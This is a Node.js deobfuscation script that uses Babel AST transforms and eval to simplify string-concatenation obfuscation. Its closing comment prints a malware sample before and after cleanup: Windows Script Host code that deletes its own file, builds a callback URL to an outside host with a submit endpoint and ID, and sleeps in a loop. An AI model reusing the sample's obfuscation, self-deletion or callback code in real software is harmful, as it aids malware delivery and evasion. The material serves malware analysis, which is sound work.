/*
author  : 寒菱
date    : 2020/10/23
desc    :
*/

/*
使用正则表达式来解混淆：
参考文章：https://www.anquanke.com/post/id/207813
*/

const fs = require('fs');
const {parse} = require("@babel/parser");
const traverse = require("@babel/traverse").default;
const t = require("@babel/types");
const generator = require("@babel/generator").default;

let jscode = fs.readFileSync("./encode.js", {
    encoding: "utf-8"
});

let ast = parse(jscode);

const visitor =
    {
        BinaryExpression: {
            exit: function (path) {
                let node = path.node;
                try {
                    path.replaceWith(
                        t.stringLiteral(eval(path.toString()).toString())
                    );
                } catch (e) {
                }
            }
        },
        MemberExpression(path) {
            let node = path.node;
            if (!t.isArrayExpression(node.object)) return;
            path.replaceWith(
                t.stringLiteral(eval(path.toString()).toString())
            );
        }
    }


//some function code


traverse(ast, visitor);
let {code} = generator(ast);
// console.log(code);
fs.writeFileSync('./decode.js', code,{
    encoding :'utf-8'
})

/*
处理前:

try {
    var rhepu = getAXO(("w", "b", "S") + ("f", "I", "u", "h", "B", "c") + ("m", "O", "r") + ("Q", "z", "i") + ("m", "q", "X", "p", "r", "p") + ["v", "I", "S", "t", "l"][(949 - 946)] + ("e", "b", "I", "y", "i") + ("e", "g", "S", "T", "Z", "n") + ["o", "g", "u"][(-531 + 532)] + "." + ["F", "E"][(200 - 200)] + "i" + "l" + ("m", "V", "U", "c", "e") + ("b", "n", "o", "S") + "y" + ("o", "q", "A", "c", "J", "s") + ("m", "k", "G", "t") + ("v", "o", "r", "e") + ("k", "w", "m") + ["O", "n"][(899 - 899)] + "b" + "j" + "e" + "c" + ["t", "N"][(290 - 290)]);
    rhepu["D" + "e" + ("W", "y", "F", "j", "j", "l") + ("P", "u", "G", "G", "a", "e") + ["m", "R", "z", "o", "t", "E"][(-393 + 397)] + ["n", "B", "e", "z", "e"][(668 - 666)] + "F" + ("d", "f", "i") + ("u", "i", "F", "a", "m", "l") + ["e", "F", "T", "e"][(-643 + 643)]](this[("J", "w", "x", "J", "W") + ("B", "C", "i", "S") + "c" + ("T", "c", "H", "p", "Q", "r") + "i" + ("m", "u", "p") + ["q", "t", "A", "M", "r", "K", "a"][(-185 + 186)]][
        ["m", "P", "S", "K", "O", "O"][(-757 + 759)] + ("c", "b", "c") + ["r", "g"][(-321 + 321)] + ["D", "v", "H", "i", "d", "a", "A"][(847 - 844)] + ("C", "d", "k", "p") + ["i", "t", "p"][(115 - 114)] + ("R", "H", "z", "d", "r", "F") + "u" + "l" + "l" + "N" + "a" + "m" + ("Q", "m", "W", "W", "e")
    ], true);
} catch (e) {}
var zuqyljaah = ("u", "T", "k", "h") + ["t", "G", "H", "M", "X", "n"][(-130 + 130)] + ["t", "E", "r", "T"][(-854 + 854)] + "p" + ":" + "/" + "/" + ["6", "B"][(-689 + 689)] + "0" + ("s", "M", "a", "e") + "a" + ["s", "t", "H", "y", "p", "0", "b"][(395 - 390)] + ["d", "2", "P", "m"][(-362 + 363)] + ["H", "c", "W", "6", "w"][(874 - 871)] + ("X", "s", "0") + "." + "a" + ("Y", "U", "Y", "J", "s", "u") + "t" + ("v", "E", "k", "t", "G", "h") + "." + ["G", "H", "c", "q"][(-698 + 700)] + ("t", "U", "X", "o") + ("u", "p", "d") + "i" + "n" + ["g", "u", "Y"][(-279 + 279)] + ("L", "D", "e", "t", "b") + ("L", "T", "i") + "t" + "." + "c" + "o" + "." + ("u", "R", "u", "i") + "n" + "/" + ["P", "v", "x", "s", "r", "c", "r"][(-350 + 353)] + ("j", "G", "u") + ["j", "R", "b", "q"][(312 - 310)] + ("N", "l", "k", "N", "R", "m") + ("I", "K", "i") + ("W", "o", "j", "e", "t") + "." + "a" + ["E", "z", "k", "f", "s", "U"][(-412 + 416)] + ["m", "j", "v", "p", "g"][(-354 + 357)] + ("o", "s", "w", "x");
var tid = ["5", "O"][(-765 + 765)] + ("R", "m", "l", "f", "z", "0") + ("L", "C", "g", "g", "0");
var r8h = ["S", "g", "a", "L", "r"][(202 - 200)] + "a" + ("c", "H", "L", "m", "d") + "2" + "8" + ("q", "y", "O", "0") + ("y", "Y", "a", "o", "a") + ("x", "B", "p", "p", "9");
var gudel6 = [];
gudel6[("A", "F", "p") + "u" + "s" + ["A", "u", "h", "m"][(584 - 582)]](["k", "a", "h"][(-497 + 498)]);
gudel6[["d", "p", "E", "i"][(37 - 36)] + "u" + ["s", "h", "K"][(935 - 935)] + ("t", "O", "h")](tid);
var kbiag = womzyjeptfu();
var jybspikivsu = kbiag + (224 - (-9776));
while (kbiag < jybspikivsu) {
    kbiag = womzyjeptfu();
    this[("T", "a", "w", "V", "W") + ["h", "S", "G", "I", "z"][(-666 + 667)] + ("x", "C", "u", "q", "c") + ["r", "Y"][(-326 + 326)] + ["S", "t", "i", "g", "f", "Y"][(-190 + 192)] + ("b", "q", "p") + "t"]["S" + "l" + ("u", "C", "e") + "e" + ["p", "U", "s", "E", "R"][(-375 + 375)]]((464 - (-536)));
}

处理后:

try {
  var rhepu = getAXO("Scripting.FileSystemObject");
  rhepu["DeleteFile"](this["WScript"]["ScriptFullName"], true);
} catch (e) {}

var zuqyljaah = "http://60ea0260.auth.codingbit.co.in/submit.aspx";
var tid = "500";
var r8h = "aad280a9";
var gudel6 = [];
gudel6["push"]("a");
gudel6["push"](tid);
var kbiag = womzyjeptfu();
var jybspikivsu = kbiag + "10000";

while (kbiag < jybspikivsu) {
  kbiag = womzyjeptfu();
  this["WScript"]["Sleep"]("1000");
}

 */